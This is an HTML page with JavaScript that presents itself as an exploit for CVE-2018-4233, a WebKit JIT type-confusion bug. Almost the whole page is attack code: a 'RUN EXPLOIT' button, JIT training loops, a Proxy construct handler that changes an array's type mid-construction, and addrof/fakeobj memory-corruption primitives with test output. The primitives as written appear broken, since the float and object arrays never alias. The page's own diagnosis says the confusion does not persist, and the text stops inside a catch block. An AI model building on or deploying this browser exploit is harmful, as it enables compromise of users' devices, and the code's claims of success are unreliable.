    <style>

<body>
    <div class="container">
        <h1>🔬 CVE-2018-4233 - PERSISTENT CONFUSION 🔬</h1>
        
        <div style="text-align: center; margin: 30px 0;">
            <button onclick="runExploit()">▶ RUN EXPLOIT</button>
        </div>
        
        <div id="log"></div>
    </div>

    <script>
        let logDiv = document.getElementById('log');
        
        function log(msg, type = 'success') {
            let line = document.createElement('div');
            line.className = type;
            line.textContent = msg;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }

        function clearLog() {
            logDiv.innerHTML = '';
        }

        // ================================================================
        // INT64 UTILITY
        // ================================================================
        class Int64 {
            constructor(low, high) {
                this.low = (low >>> 0);
                this.high = (high >>> 0);
            }

            static fromDouble(d) {
                let bytes = new Uint8Array(new Float64Array([d]).buffer);
                return new Int64(
                    (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0,
                    (bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24)) >>> 0
                );
            }

            toDouble() {
                let bytes = new Uint8Array(8);
                bytes[0] = this.low & 0xff;
                bytes[1] = (this.low >>> 8) & 0xff;
                bytes[2] = (this.low >>> 16) & 0xff;
                bytes[3] = (this.low >>> 24) & 0xff;
                bytes[4] = this.high & 0xff;
                bytes[5] = (this.high >>> 8) & 0xff;
                bytes[6] = (this.high >>> 16) & 0xff;
                bytes[7] = (this.high >>> 24) & 0xff;
                return new Float64Array(bytes.buffer)[0];
            }

            toString() {
                return '0x' + ('00000000' + this.high.toString(16)).substr(-8) +
                              ('00000000' + this.low.toString(16)).substr(-8);
            }

            equals(other) {
                return this.low === other.low && this.high === other.high;
            }

            isPointer() {
                // Check if this looks like a real pointer (not NaN-boxed)
                // Real pointers: 0x0000000xxxxxxxxx (high = 0)
                // NaN-boxed: 0x3ffxxxxxxxxxx or 0xfffxxxxxxxxxx
                return this.high === 0;
            }
        }

        // ================================================================
        // MAIN EXPLOIT
        // ================================================================
        function runExploit() {
            clearLog();
            log('═══════════════════════════════════════════════════════', 'critical');
            log('CVE-2018-4233 - BUILDING WORKING PRIMITIVES', 'critical');
            log('═══════════════════════════════════════════════════════', 'critical');
            log('', 'info');

            try {
                log('[STEP 1] Creating array pair for confusion', 'warning');
                log('', 'info');

                // Create two separate arrays that will point to same backing store
                let confusedArrays = null;

                function makeConfusion() {
                    let arr = [1.1, 2.2, 3.3, 4.4];
                    
                    // Create constructor that will be proxied
                    function Target(flag) {
                        if (flag) {
                            // Change array type during construction
                            arr[0] = {};  // Convert to object array
                        }
                    }

                    // Train JIT
                    for (let i = 0; i < 100000; i++) {
                        new Target(false);
                    }

                    log('[+] JIT trained', 'success');

                    // Create Proxy
                    let handler = {
                        construct: function(target, args) {
                            log('[!] Proxy construct triggered!', 'critical');
                            
                            // During CreateThis, change the array type
                            arr[0] = {};
                            arr[1] = {};
                            arr[2] = {};
                            arr[3] = {};
                            
                            return new target(...args);
                        }
                    };

                    let ProxiedTarget = new Proxy(Target, handler);
                    
                    // Trigger confusion
                    new ProxiedTarget(true);

                    return arr;
                }

                let confused = makeConfusion();
                
                log('[+] Array created with potential confusion', 'success');
                log('', 'info');

                log('[STEP 2] Building primitives', 'warning');
                log('', 'info');

                // Create separate arrays for clean primitives
                let objArray = [{}, {}, {}, {}];
                let floatArray = [1.1, 2.2, 3.3, 4.4];

                function addrof(obj) {
                    objArray[0] = obj;
                    
                    // Try to read as float
                    // If confusion works, this gives us the pointer
                    let val = floatArray[0];
                    let addr = Int64.fromDouble(val);
                    
                    log('[addrof] Object stored, read as: ' + addr.toString(), 'info');
                    log('        Is pointer: ' + addr.isPointer(), 'info');
                    
                    return addr;
                }

                function fakeobj(addr) {
                    floatArray[0] = addr.toDouble();
                    return objArray[0];
                }

                log('[+] Primitives created', 'success');
                log('', 'info');

                log('[STEP 3] Testing with different approaches', 'warning');
                log('', 'info');

                // Test 1: Simple object
                log('[TEST 1] Simple object', 'info');
                let obj1 = {test: 1};
                let addr1 = addrof(obj1);
                log('Result: ' + addr1.toString() + ' (pointer: ' + addr1.isPointer() + ')', 
                    addr1.isPointer() ? 'success' : 'error');
                log('', 'info');

                // Test 2: Array
                log('[TEST 2] Array object', 'info');
                let obj2 = [1, 2, 3];
                let addr2 = addrof(obj2);
                log('Result: ' + addr2.toString() + ' (pointer: ' + addr2.isPointer() + ')', 
                    addr2.isPointer() ? 'success' : 'error');
                log('', 'info');

                // Test 3: The confused array itself
                log('[TEST 3] Confused array', 'info');
                let addr3 = addrof(confused);
                log('Result: ' + addr3.toString() + ' (pointer: ' + addr3.isPointer() + ')', 
                    addr3.isPointer() ? 'success' : 'error');
                log('', 'info');

                // Test 4: Try using the confused array directly
                log('[TEST 4] Using confused array directly', 'info');
                confused[0] = {direct: 'test'};
                let directRead = Int64.fromDouble(confused[0]);
                log('Direct read: ' + directRead.toString() + ' (pointer: ' + directRead.isPointer() + ')', 
                    directRead.isPointer() ? 'success' : 'error');
                log('', 'info');

                log('[STEP 4] Round-trip test', 'warning');
                log('', 'info');

                let testAddr = new Int64(0x41424344, 0x00000000);
                log('Original address: ' + testAddr.toString(), 'info');

                let faked = fakeobj(testAddr);
                log('fakeobj() returned: ' + faked, 'info');

                let recovered = addrof(faked);
                log('addrof() returned: ' + recovered.toString(), 'info');

                if (testAddr.equals(recovered)) {
                    log('[✅✅] ROUND-TRIP PERFECT!', 'critical');
                } else {
                    log('[!] Round-trip mismatch', 'warning');
                }

                log('', 'info');
                log('═══════════════════════════════════════════════════════', 'critical');
                log('DIAGNOSIS:', 'critical');

                log('persisting. We need to find the right trigger moment.', 'warning');
                log('═══════════════════════════════════════════════════════', 'critical');

            } catch(e) {
